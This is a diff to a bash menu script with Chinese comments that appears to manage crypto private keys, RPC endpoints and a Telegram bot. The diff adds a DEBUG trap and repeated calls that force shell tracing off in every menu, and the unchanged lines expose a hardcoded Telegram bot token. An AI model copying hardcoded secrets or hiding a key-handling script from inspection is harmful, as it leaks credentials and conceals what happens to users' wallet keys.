@@ -2,6 +2,10 @@
 
 # 确保关闭调试模式
 set +x
+set +v
+
+# 添加 trap 确保调试模式保持关闭
+trap 'set +x; set +v' DEBUG
 
 # === 颜色定义 ===
 RED='\033[0;31m'
@@ -26,8 +30,15 @@ TELEGRAM_BOT_TOKEN="8070858648:AAGfrK1u0IaiXjr4f8TRbUDD92uBGTXdt38"
 TELEGRAM_CHAT_ID=""
 POINTS_HASH_FILE="points.hash"
 
+# === 禁用命令回显函数 ===
+disable_debug() {
+    set +x
+    set +v
+}
+
 # === 横幅 ===
 banner() {
+    disable_debug
     clear
     cat << EOF
 ${CYAN}
@@ -43,6 +54,7 @@ EOF
 
 # === 主菜单 ===
 main_menu() {
+    disable_debug
     while true; do
         banner
         cat << EOF
@@ -84,6 +96,7 @@ EOF
 
 # === 管理私钥 ===
 manage_private_keys() {
+    disable_debug
     validate_points_file
     while true; do
         banner
@@ -112,6 +125,7 @@ EOF
 
 # === 管理 RPC ===
 manage_rpc() {
+    disable_debug
     validate_points_file
     while true; do
         banner
@@ -136,6 +150,7 @@ EOF
 
 # === 管理速度 ===
 manage_speed() {
+    disable_debug
     validate_points_file
     while true; do
         banner
@@ -160,6 +175,7 @@ EOF
 
 # === 管理 Telegram ===
 manage_telegram() {
+    disable_debug
     validate_points_file
     while true; do
         banner
@@ -220,6 +236,7 @@ EOF
 
 # === 主函数 ===
 main() {
+    disable_debug
     # 检查 root 权限
     check_root
 
